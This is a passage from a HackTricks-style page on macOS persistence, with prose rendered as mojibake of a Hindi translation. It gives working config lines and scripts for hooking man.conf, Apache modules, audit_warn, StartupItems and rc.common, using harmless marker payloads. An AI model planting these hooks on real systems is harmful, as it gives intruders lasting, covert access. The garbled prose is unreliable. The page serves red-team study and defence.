рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ **`/private/etc/man.conf`** рдореИрди рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдлрд╝рд╛рдЗрд▓реЗрдВ рдЦреЛрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдмрд╛рдЗрдирд░реА/рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рджрд░реНрд╢рд╛рддреА рд╣реИред рдЗрд╕рд▓рд┐рдП, рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдкрд░ рдПрдХреНрд╕реЗрдХреНрдпреВрдЯреЗрдмрд▓ рдХреЗ рдкрде рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЬрдм рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд┐рд╕реА рдбреЙрдХреНрд╕ рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП man рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдПрдХ рдмреИрдХрдбреЛрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **`/private/etc/man.conf`** рдореЗрдВ рд╕реЗрдЯ рдХрд░реЗрдВ:
```
MANPAGER /tmp/view
```
рдФрд░ рдлрд┐рд░ `/tmp/view` рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░реВрдк рдореЗрдВ рдмрдирд╛рдПрдБ:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**рд▓реЗрдЦ**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [ЁЯЯа](https://emojipedia.org/large-orange-circle)
* рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рд░реВрдЯ рдпреВрдЬрд╝рд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рдПрдкрд╛рдЪреЗ рдЪрд▓ рд░рд╣рд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП

#### рд╕реНрдерд╛рди

* **`/etc/apache2/httpd.conf`**
* рд░реВрдЯ рдпреВрдЬрд╝рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛
* рдЯреНрд░рд┐рдЧрд░: рдЬрдм Apache2 рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ

#### рд╡рд┐рд╡рд░рдг рдФрд░ рдЙрддреНрдкрд╛рджрди

рдЖрдк /etc/apache2/httpd.conf рдореЗрдВ рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдореЙрдбреНрдпреВрд▓ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкрдВрдХреНрддрд┐ рдЬреЛрдбрд╝реЗрдВ:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

рдЗрд╕ рддрд░рд╣ рдЖрдкрдХреЗ рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдП рдЧрдП рдореЙрдбреНрдпреВрд▓ Apache рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рд╣реЛрдВрдЧреЗред рдПрдХрдорд╛рддреНрд░ рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐ рдЖрдкрдХреЛ рдЗрд╕реЗ рдПрдХ рдорд╛рдиреНрдп Apple рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рд╕рд╛рдЗрди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдпрд╛ рдЖрдкрдХреЛ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдПрдХ рдирдпрд╛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЬреЛрдбрд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рд╕рд╛рдЗрди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

рдлрд┐рд░, рдпрджрд┐ рдЖрд╡рд╢реНрдпрдХ рд╣реЛ, рд╕рд░реНрд╡рд░ рдХреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
рдбрд╛рдЗрд▓рдм рдХреЗ рд▓рд┐рдП рдХреЛрдб рдЙрджрд╛рд╣рд░рдг:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM рдСрдбрд┐рдЯ рдлреНрд░реЗрдорд╡рд░реНрдХ

рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [ЁЯЯа](https://emojipedia.org/large-orange-circle)
* рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рд░реВрдЯ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдСрдбрд┐рдЯрдбреА рдЪрд▓ рд░рд╣рд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рдЪреЗрддрд╛рд╡рдиреА рдХрд╛ рдХрд╛рд░рдг рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП

#### рд╕реНрдерд╛рди

* **`/etc/security/audit_warn`**
* рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛
* **рдЯреНрд░рд┐рдЧрд░**: рдЬрдм рдСрдбрд┐рдЯрдбреА рдЪреЗрддрд╛рд╡рдиреА рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИ

#### рд╡рд┐рд╡рд░рдг рдФрд░ рдЙрддреНрдкрд╛рджрди

рдЬрдмрдХрд┐ рдСрдбрд┐рдЯрдбреА рдЪреЗрддрд╛рд╡рдиреА рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИ, рд╕реНрдХреНрд░рд┐рдкреНрдЯ **`/etc/security/audit_warn`** **рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП рдЖрдк рдЗрд╕ рдкрд░ рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
рдЖрдк `sudo audit -n` рдХреЗ рд╕рд╛рде рдПрдХ рдЪреЗрддрд╛рд╡рдиреА рд▓рд╛рдЧреВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рд╕реНрдЯрд╛рд░реНрдЯрдЕрдк рдЖрдЗрдЯрдореНрд╕

{% hint style="danger" %}
**рдпрд╣ рдкреБрд░рд╛рдирд╛ рд╣реЛ рдЧрдпрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдореЗрдВ рдХреБрдЫ рдирд╣реАрдВ рдорд┐рд▓рдирд╛ рдЪрд╛рд╣рд┐рдПред**
{% endhint %}

рдПрдХ **рд╕реНрдЯрд╛рд░реНрдЯрдЕрдк рдЖрдЗрдЯрдо** рдПрдХ **рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛** рд╣реИ рдЬреЛ рдЗрди рджреЛ рдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдореЗрдВ рд░рдЦреА рдЬрд╛рддреА рд╣реИред `/Library/StartupItems/` рдпрд╛ `/System/Library/StartupItems/`

рдЗрди рджреЛ рд╕реНрдерд╛рдиреЛрдВ рдореЗрдВ рдПрдХ рдирдИ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд░рдЦрдиреЗ рдХреЗ рдмрд╛рдж, рдЙрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рдЕрдВрджрд░ **рдФрд░ рджреЛ рдЖрдЗрдЯрдо** рд░рдЦрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдпреЗ рджреЛ рдЖрдЗрдЯрдо рдПрдХ **rc рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдФрд░ рдХреБрдЫ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рд░рдЦрдиреЗ рд╡рд╛рд▓реА **plist** рд╣реЛрддреА рд╣реИред рдЗрд╕ plist рдХрд╛ рдирд╛рдо "StartupParameters.plist" рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% tab title="рд╕реБрдкрд░рд╕реЗрд╡рд╛рдирд╛рдо" %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
рдореИрдВ рдЕрдкрдиреЗ macOS рдореЗрдВ рдЗрд╕ рдХрдВрдкреЛрдиреЗрдВрдЯ рдХреЛ рдирд╣реАрдВ рдвреВрдВрдв рд╕рдХрддрд╛ рд╣реВрдБ, рдЗрд╕рд▓рд┐рдП рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рд╡реНрд░рд╛рдЗрдЯрдЕрдк рджреЗрдЦреЗрдВ
{% endhint %}

рд╡реНрд░рд╛рдЗрдЯрдЕрдк: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Apple рдиреЗ рдПрдХ рд▓реЙрдЧрд┐рдВрдЧ рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рдХреЛ **emond** рдХреЗ рдирд╛рдо рд╕реЗ рдкреЗрд╢ рдХрд┐рдпрд╛ред рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЗрд╕реЗ рдХрднреА рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╡рд┐рдХрд╕рд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдФрд░ рдПрдкреНрдкрд▓ рдиреЗ рдЕрдиреНрдп рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рдХреЗ рд▓рд┐рдП рдЗрд╕рдХреЗ рд╡рд┐рдХрд╛рд╕ рдХреЛ **рдЫреЛрдбрд╝ рджрд┐рдпрд╛** рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ **рдЙрдкрд▓рдмреНрдз** рд╣реИред

рдпрд╣ рдЫреЛрдЯреА-рдЬрд╛рдиреА рд╡рд╛рд▓реА рд╕реЗрд╡рд╛ рдПрдХ Mac рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд▓рд┐рдП **рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреА рд╣реИ**, рд▓реЗрдХрд┐рди рдПрдХ рдзрдордХреА рдкреНрд░рджрд╛рддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛ рдХрд╛рд░рдг рд╣реЛрдЧрд╛ рдХрд┐ рд╡рд╣ рдЗрд╕реЗ рдПрдХ **рд╕реНрдерд╛рдпрд┐рддреНрд╡ рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ** рдХрд░реЗрдВ, рдЬрд┐рд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╢рд╛рдпрдж рдЕрдзрд┐рдХрд╛рдВрд╢ macOS рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЬрд╛рдирддреЗ рд╣реА рдирд╣реАрдВ рд╣реЛрдВрдЧреЗред emond рдХреЗ рджреБрд╖реНрдкреНрд░рднрд╛рд╡реА рдЙрдкрдпреЛрдЧ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рдХрдард┐рди рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдХреНрдпреЛрдВрдХрд┐ рд╕рд┐рд╕реНрдЯрдо рд▓реЙрдиреНрдЪрдбреЗрдорди рд╕реЗрд╡рд╛ рдХреЗрд╡рд▓ рдПрдХ рд╣реА рд╕реНрдерд╛рди рдореЗрдВ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЦреЛрдЬрддреА рд╣реИ:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### рд╕реНрдерд╛рди

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛
* **рдЯреНрд░рд┐рдЧрд░**: XQuartz рдХреЗ рд╕рд╛рде

#### рд╡рд┐рд╡рд░рдг рдФрд░ рдЕрднрд┐рдХрд░реНрдо

XQuartz **macOS рдореЗрдВ рдЕрдм рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рд▓реЗрдЦ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред

### ~~kext~~

{% hint style="danger" %}
рдХреЗрд╡рд▓ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ kext рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рдЗрддрдирд╛ рдХрдард┐рди рд╣реИ рдХрд┐ рдореИрдВ рдЗрд╕реЗ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдпрд╛ рд╕реНрдерд┐рд░рддрд╛ рдХреЗ рд▓рд┐рдП рд╡рд┐рдЪрд╛рд░ рдирд╣реАрдВ рдХрд░реВрдВрдЧрд╛ (рдЬрдм рддрдХ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреЛрдИ рдЕрднрд┐рдХрд░реНрдо рди рд╣реЛ)
{% endhint %}

#### рд╕реНрдерд╛рди

рд╕реНрдЯрд╛рд░реНрдЯрдЕрдк рдЖрдЗрдЯрдо рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ KEXT рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд╛рдиреЛрдВ рдореЗрдВ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП:

* `/System/Library/Extensions`
* OS X рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдмрд┐рд▓реНрдЯ-рдЗрди KEXT рдлрд╝рд╛рдЗрд▓реЗрдВред
* `/Library/Extensions`
* рддреГрддреАрдп-рдкрдХреНрд╖ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рджреНрд╡рд╛рд░рд╛ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдП рдЧрдП KEXT рдлрд╝рд╛рдЗрд▓реЗрдВ

рдЖрдк рд╡рд░реНрддрдорд╛рди рдореЗрдВ рд▓реЛрдб рдХрд┐рдП рдЧрдП kext рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рд╕реВрдЪреА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдХрд░реНрдирд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдЦрдВрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**](macos-security-and-privilege-escalation/mac-os-architecture#i-o-kit-drivers).

### ~~amstoold~~

рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### рд╕реНрдерд╛рди

* **`/usr/local/bin/amstoold`**
* рд░реВрдЯ рдЕрдирд┐рд╡рд╛рд░реНрдп

#### рд╡рд┐рд╡рд░рдг рдФрд░ рд╢реЛрд╖рдг

рдЬрд╛рд╣рд┐рд░ рд╣реИ рдХрд┐ `/System/Library/LaunchAgents/com.apple.amstoold.plist` рд╕реЗ рдпрд╣ рдмрд╛рдЗрдирд░реА рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рдерд╛ рдЬрдмрдХрд┐ рдПрдХ XPC рд╕реЗрд╡рд╛ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд░рд╣рд╛ рдерд╛... рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдмрд╛рдЗрдирд░реА рдореМрдЬреВрдж рдирд╣реАрдВ рдереА, рдЗрд╕рд▓рд┐рдП рдЖрдк рд╡рд╣рд╛рдВ рдХреБрдЫ рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЬрдм XPC рд╕реЗрд╡рд╛ рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдЖрдкрдХреА рдмрд╛рдЗрдирд░реА рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдореБрдЭреЗ рдЕрдм рдЕрдкрдиреЗ macOS рдореЗрдВ рдпрд╣ рдирд╣реАрдВ рдорд┐рд▓ рд░рд╣рд╛ рд╣реИред

### ~~xsanctl~~

рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### рд╕реНрдерд╛рди

* **`/Library/Preferences/Xsan/.xsanrc`**
* рд░реВрдЯ рдЕрдирд┐рд╡рд╛рд░реНрдп
* **рдЯреНрд░рд┐рдЧрд░**: рд╕реЗрд╡рд╛ рдЪрд▓рд╛рдИ рдЬрд╛рддреА рд╣реИ (рд╢рд╛рдпрдж)

#### рд╡рд┐рд╡рд░рдг рдФрд░ рд╢реЛрд╖рдг

рдЬрд╛рд╣рд┐рд░ рд╣реИ рдХрд┐ рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЪрд▓рд╛рдирд╛ рдЕрдзрд┐рдХрд╛рдВрд╢ рдмрд╛рд░ рдЖрдо рдирд╣реАрдВ рд╣реИ рдФрд░ рдореИрдВ рдЕрдкрдиреЗ macOS рдореЗрдВ рдЗрд╕реЗ рднреА рдирд╣реАрдВ рдвреВрдВрдв рд╕рдХрд╛, рдЗрд╕рд▓рд┐рдП рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рд▓реЗрдЦ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред

### ~~/etc/rc.common~~

{% hint style="danger" %}
**рдпрд╣ рдореЙрдбрд░реНрди MacOS рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИ**
{% endhint %}

рдпрд╣рд╛рдВ **рд╕реНрдЯрд╛рд░реНрдЯрдЕрдк рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдХрдорд╛рдВрдб** рднреА рд░рдЦрдирд╛ рд╕рдВрднрд╡ рд╣реИред рдПрдХ рд╕рд╛рдзрд╛рд░рдг rc.common рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence techniques and tools

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ** (https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>
